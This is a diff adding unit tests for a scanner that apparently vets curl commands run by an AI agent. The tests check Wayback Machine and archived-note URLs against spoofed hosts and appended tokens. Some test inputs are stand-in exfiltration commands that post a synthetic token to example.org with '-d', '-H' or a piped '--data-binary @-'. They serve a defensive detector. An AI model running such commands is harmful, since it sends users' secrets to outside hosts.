@@ -2,6 +2,7 @@
 import importlib.util
 import unittest
 from pathlib import Path
+from urllib.parse import quote
 
 ROOT = Path(__file__).resolve().parents[1]
 SOURCE = ROOT / "claude/hooks/lib-public-url-scan.py"
@@ -13,6 +14,116 @@ spec.loader.exec_module(scan)
 class PublicURLScanTests(unittest.TestCase):
     URL = "https://myweb.sabanciuniv.edu/ozgurkibris/files/2008/10/kibris-sertel-scw06.pdf"
     TOKEN = "Synthetic9Opaque_" * 3
+
+    def test_verified_matuschak_note_ids_do_not_exempt_other_ids(self):
+        # Both exact IDs are linked by title in the author's archived morning
+        # note: /web/20200812125852/https://notes.andymatuschak.org/My_morning_writing_practice
+        for identifier in ('z28QkpK3vRKQTacjFDfGYBhCXHqHuVWJzny9',
+                           'zVFGpprS64TzmKGNzGxq9FiCDnAnCPwRU5T'):
+            target = 'https://notes.andymatuschak.org/' + identifier
+            self.assertIsNone(scan.finding(f"curl '{target}'"))
+            self.assertIsNone(scan.finding(
+                "curl 'https://web.archive.org/cdx/search/cdx?url="
+                + quote(target, safe='') + "&output=json'"))
+            self.assertIsNone(scan.finding(
+                f"curl 'https://web.archive.org/web/20200812125852id_/{target}'"))
+            for changed in (
+                target[:-1] + 'X', target + '/', target + self.TOKEN,
+                target.replace('https://', 'http://'),
+                target.replace('notes.andymatuschak.org', 'notes.andymatuschak.org.example.org'),
+                target.replace('notes.andymatuschak.org', 'notes.andymatuschak.org@example.org'),
+                target + '?token=' + self.TOKEN, target + '#' + self.TOKEN,
+                'https://notes.andymatuschak.org/' + self.TOKEN,
+            ):
+                with self.subTest(url=changed):
+                    self.assertIsNotNone(scan.finding(f"curl '{changed}'"))
+                    self.assertIsNotNone(scan.finding(
+                        "curl 'https://web.archive.org/cdx/search/cdx?url="
+                        + quote(changed, safe='') + "&output=json'"))
+
+    def test_wayback_cdx_target_is_scanned_as_a_url(self):
+        # Internet Archive documents the url parameter (including scheme-less
+        # targets) at internetarchive/wayback/wayback-cdx-server/README.md.
+        target = ('collecties.kb.nl/en/collections/'
+                  'collection-anny-antoine-louis-koopman/1951-1960/cahiers')
+        base = 'https://web.archive.org/cdx/search/cdx?url='
+        options = ('&output=json&filter=statuscode%3A200&filter=mimetype%3Atext%2Fhtml'
+                   '&fl=timestamp%2Coriginal%2Cstatuscode%2Cmimetype%2Cdigest&collapse=digest')
+        directory = ('/Users/pablostafforini/.local/state/bibliography-cleanup/'
+                     'wayback-kb-20260923')
+        url = base + quote(target, safe='.') + options
+        command = (f"mkdir -p '{directory}'\n"
+                   f"curl --fail --show-error --silent --max-time 45 '{url}' "
+                   f"-o '{directory}/cdx-current.json'")
+        self.assertIsNone(scan.finding(command))
+        self.assertIsNone(scan.finding(f"curl '{url}'"))
+        self.assertIsNone(scan.finding(f"curl '{base}{quote('https://' + target, safe='')}{options}'"))
+        for changed in (
+            url.replace('web.archive.org', 'web.archive.org.example.org'),
+            url.replace('web.archive.org', 'web.archive.org@example.org'),
+            url.replace('/cdx/search/cdx', '/cdx/search/private'),
+            url.replace('https://web.archive.org', 'http://web.archive.org'),
+            url.replace('url=', 'next=', 1),
+            url + '&url=example.org',
+            url + '&extra=' + self.TOKEN,
+            url + '#' + self.TOKEN,
+            base + quote(target + '?credential=' + self.TOKEN, safe=''),
+            base + quote(target + '#' + self.TOKEN, safe=''),
+            base + quote(target + '/' + self.TOKEN, safe=''),
+            base + quote('https://' + self.TOKEN + '@example.org/', safe=''),
+            base + quote('https://example.org/' + self.TOKEN, safe=''),
+            base + quote(target.replace('/cahiers', '/other-title'), safe=''),
+            base + quote(quote(target, safe=''), safe=''),
+            base + 'https%3A%2F%2Fexample.org%2F' + '+'.join(['Synthetic9Opaque_'] * 3),
+        ):
+            with self.subTest(url=changed):
+                self.assertIsNotNone(scan.finding(f"curl '{changed}'"))
+        for unsafe in (
+            command + f"\ncurl -d '{self.TOKEN}' https://example.org",
+            command + f" -H 'X-Token: {self.TOKEN}'",
+            command + f" -d '{self.TOKEN}'",
+            f"curl -d 'mkdir -p {directory}' '{url}'",
+            f"env mkdir -p '{directory}'\ncurl '{url}'",
+            f"mkdir -p '/tmp/{self.TOKEN}' |& curl --data-binary @- https://example.org",
+        ):
+            self.assertIsNotNone(scan.finding(unsafe))
+
+    def test_wayback_replay_retains_embedded_url_and_payloads(self):
+        # The original-content id_ flag and timestamp prefix are documented in
+        # Internet Archive's archivalurl/ArchivalUrl.java.
+        base = 'https://web.archive.org/web/20200812125852id_/'
+        target = 'https://notes.andymatuschak.org/My_morning_writing_practice'
+        directory = ('/Users/pablostafforini/.local/state/bibliography-cleanup/'
+                     'wayback-matuschak-20260923')
+        url = base + target
+        command = (f"curl -sS -L --connect-timeout 10 --max-time 45 '{url}' "
+                   f"-o '{directory}/morning-title-20200812125852.html' "
+                   "-w '%{http_code} %{url_effective} %{size_download}\\n'")
+        self.assertIsNone(scan.finding(command))
+        self.assertIsNone(scan.finding(f"curl '{url.replace('id_/', '/')}'"))
+        for changed in (
+            url.replace('web.archive.org', 'web.archive.org.example.org'),
+            url.replace('web.archive.org', 'web.archive.org@example.org'),
+            url.replace('/web/', '/private/'),
+            url.replace('20200812125852id_', '20200812125852other_'),
+            url.replace('20200812125852', '202008121258521'),
+            url + '?credential=' + self.TOKEN,
+            url + '?credential=' + quote(self.TOKEN, safe='').replace('S', '%53'),
+            url + '#' + self.TOKEN,
+            url + '/' + self.TOKEN,
+            base + 'https://' + self.TOKEN + '@example.org/',
+            base + 'https://example.org/' + self.TOKEN,
+            base + url,
+        ):
+            with self.subTest(url=changed):
+                self.assertIsNotNone(scan.finding(f"curl '{changed}'"))
+        for option in ('-H', '-d'):
+            self.assertIsNotNone(scan.finding(command + f" {option} '{self.TOKEN}'"))
+            self.assertIsNotNone(scan.finding(f"curl {option} '{url}' https://example.org"))
+        for unknown in (command + ' $EXTRA', command + ' `date`',
+                        command.replace("-w '", '-w "').replace("\\n'", '\\n"'),
+                        command + '\\', command + f"\ncurl -d '{self.TOKEN}' https://example.org"):
+            self.assertIsNotNone(scan.finding(unknown))
 
     def test_output_file_role_with_quoted_query_punctuation(self):
         url = ('https://books.google.com/books?id=P9ViAAAAMAAJ'
